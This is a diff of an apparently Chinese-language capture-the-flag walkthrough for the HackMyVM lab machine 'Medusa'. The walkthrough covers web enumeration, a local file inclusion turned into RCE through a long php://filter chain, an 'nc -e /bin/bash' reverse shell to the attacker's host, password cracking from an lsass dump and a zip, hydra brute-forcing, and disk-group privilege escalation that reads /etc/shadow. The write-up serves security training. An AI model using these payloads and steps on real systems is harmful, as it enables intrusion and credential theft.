@@ -1,15 +1,13 @@
-# hmv_Medusa
-
 # 0.简介
 
-**靶机**：https://hackmyvm.eu/machines/?v=Medusa  
-**难度**：绿色  
-**目标 IP**：192.168.205.145  
-**本机 IP**：192.168.205.128
+靶机：https://hackmyvm.eu/machines/?v=Medusa
+ 难度：绿色
+ 目标 IP：192.168.205.145
+ 本机 IP：192.168.205.128
 
 # 1.扫描
 
-​`nmap`​起手
+nmap起手
 
 ```
 ┌──(kali㉿kali)-[~/test]
@@ -62,14 +60,13 @@ ftp: Login failed
 ftp> 
 ftp> exit
 221 Goodbye.
-
 ```
 
 不许登，那去看80。是个默认页
 
-![image](assets/image-20250204175233-jr7nrgs.png)
+![image-20250331190711601](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331190711760.png)
 
-有关类似是用户名的东西`Kraken`​，不管先，我们目录爆破一下
+有关类似是用户名的东西Kraken，不管先，我们目录爆破一下
 
 ps:因为它有一个manual路径会爆出很多没有利用价值的二级目录，所以我们这次用gobuster，然后再过滤一些403的没用状态码
 
@@ -99,7 +96,6 @@ Progress: 598000 / 598005 (100.00%)
 ===============================================================
 Finished
 ===============================================================
-
 ```
 
 接着爆破
@@ -129,18 +125,17 @@ Progress: 598000 / 598005 (100.00%)
 ===============================================================
 Finished
 ===============================================================
-
 ```
 
 访问/door.php
 
-![image](assets/image-20250204175416-ww4wwlg.png)
+![image-20250331190726085](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331190726175.png)
 
-输入之前获得的`Kraken`​
+输入之前获得的Kraken
 
 ps:有点搞笑，它规定了只可以输入6个字符
 
-![image](assets/image-20250204175528-288m82z.png)
+![image-20250331190733042](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331190733131.png)
 
 获得一个域名，我们加上，并且爆破一下子域
 
@@ -172,13 +167,12 @@ ________________________________________________
 
 dev                     [Status: 200, Size: 1973, Words: 374, Lines: 26, Duration: 164ms]
 [WARN] Caught keyboard interrupt (Ctrl-C)
-
 ```
 
 加上访问
 
-![image](assets/image-20250204175749-9wdg1wv.png)  
-没看到啥，目录爆破
+![image-20250331190750401](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331190750557.png)
+ 没看到啥，目录爆破
 
 ```
 ┌──(kali㉿kali)-[~/test]
@@ -207,7 +201,6 @@ Starting gobuster in directory enumeration mode
 /robots.txt           (Status: 200) [Size: 489]
 Progress: 470664 / 598005 (78.71%)
 Progress: 491780 / 598005 (82.24%)
-
 ```
 
 接着爆破/files
@@ -234,10 +227,6 @@ Starting gobuster in directory enumeration mode
 /system.php           (Status: 200) [Size: 0]
 /.                    (Status: 200) [Size: 0]
 /readme.txt           (Status: 200) [Size: 144]
-
-```
-
-```
 ┌──(kali㉿kali)-[~/test]
 └─$ curl http://dev.medusa.hmv/files/readme.txt
 -----------------------------------------------
@@ -246,7 +235,7 @@ Starting gobuster in directory enumeration mode
                                                  
 ```
 
-**谜语人滚出**哥谭
+谜语人滚出哥谭
 
 ```
 ┌──(kali㉿kali)-[~/test]
@@ -291,7 +280,6 @@ Total time: 2.243865
 Processed Requests: 309
 Filtered Requests: 308
 Requests/sec.: 137.7087
-
 ```
 
 看眼有没有密钥
@@ -308,7 +296,6 @@ Requests/sec.: 137.7087
 ┌──(kali㉿kali)-[~/test]
 └─$ curl http://dev.medusa.hmv/files/system.php?view=php://filter/convert.base64-encode/resource=/etc/passwd
 cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLXRpbWVzeW5jOng6MTA0OjExMDpzeXN0ZW1kIFRpbWUgU3luY2hyb25pemF0aW9uLCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA1OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3BlY3RyZTp4OjEwMDA6MTAwMDpzcGVjdHJlLCwsOi9ob21lL3NwZWN0cmU6L2Jpbi9iYXNoCnN5c3RlbWQtY29yZWR1bXA6eDo5OTk6OTk5OnN5c3RlbWQgQ29yZSBEdW1wZXI6LzovdXNyL3NiaW4vbm9sb2dpbgpmdHA6eDoxMDY6MTEzOmZ0cCBkYWVtb24sLCw6L3Nydi9mdHA6L3Vzci9zYmluL25vbG9naW4K                                                                                                                                    
-
 ```
 
 那直接执行命令试试
@@ -324,21 +311,17 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ```
 http://dev.medusa.hmv/files/system.php?view=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=nc%20192.168.205.128%208888%20-e%20/bin/bash
-```
-
-```
 ┌──(kali㉿kali)-[~/test]
 └─$ nc -lvnp 8888                                
 listening on [any] 8888 ...
 connect to [192.168.205.128] from (UNKNOWN) [192.168.205.145] 49190
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
-
 ```
 
 # 3. 获得稳定的 Shell
 
-获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：
+获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：
 
 ```bash
 script /dev/null -c bash  
@@ -499,7 +482,6 @@ total 12108
 drwxr-xr-x  2 root     root         4096 Jan 18  2023 .
 drwxr-xr-x 19 root     root         4096 Jan 15  2023 ..
 -rw-------  1 www-data www-data 12387024 Jan 18  2023 old_files.zip
-
 ```
 
 拷过去看看有啥
@@ -542,7 +524,6 @@ Sub items Errors: 1
 
 
 Break signaled
-
 ```
 
 爆破一下
@@ -600,7 +581,6 @@ Compressed: 12387024
 ┌──(kali㉿kali)-[~/test]
 └─$ file lsass.DMP
 lsass.DMP: Mini DuMP crash report, 12 streams, Tue Jan 17 14:08:32 2023, 0x1826 type
-
 ```
 
 参考链接：https://technicalnavigator.in/how-to-extract-information-from-dmp-files/
@@ -914,7 +894,6 @@ t0p_s3cr3t
 th3_b0ss
 UnD3sc0n0c1d0
 Wh1t3_h4ck
-
 ```
 
 汇总一下
@@ -1008,7 +987,6 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-04 18:33:
 [STATUS] attack finished for 192.168.205.145 (valid pair found)
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-04 18:33:20
-
 ```
 
 登录
@@ -1020,7 +998,6 @@ www-data@medusa:/...$ su - spectre
 Password: 
 spectre@medusa:~$ id
 uid=1000(spectre) gid=1000(spectre) groups=1000(spectre),6(disk),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
-
 ```
 
 disk我记得好像可以提权
@@ -1033,9 +1010,6 @@ df -h
 #使用debugfs查看文件
 debugfs /dev/sda1
 debugfs: cat /root/.ssh/id_rsa
-```
-
-```
 spectre@medusa:~$ df -h
 Filesystem      Size  Used Avail Use% Mounted on
 /dev/sda1       6.9G  2.1G  4.5G  32% /
@@ -1081,7 +1055,6 @@ sshd:*:19372:0:99999:7:::
 spectre:$y$j9T$4TeFHbjRqRC9royagYTTJ/$KnU7QK1u0/5fpHHqE/ehPe6uqpwbs6vuvcQQH4EF9ZB:19374:0:99999:7:::
 systemd-coredump:!*:19372::::::
 ftp:*:19372:0:99999:7:::
-
 ```
 
 拿去爆破
@@ -1121,7 +1094,7 @@ spectre@medusa:~$ su -
 Password: 
 root@medusa:~# id
 uid=0(root) gid=0(root) groups=0(root)
-
 ```
 
-‍
+
+<!-- ##{"timestamp":1738666533}## -->
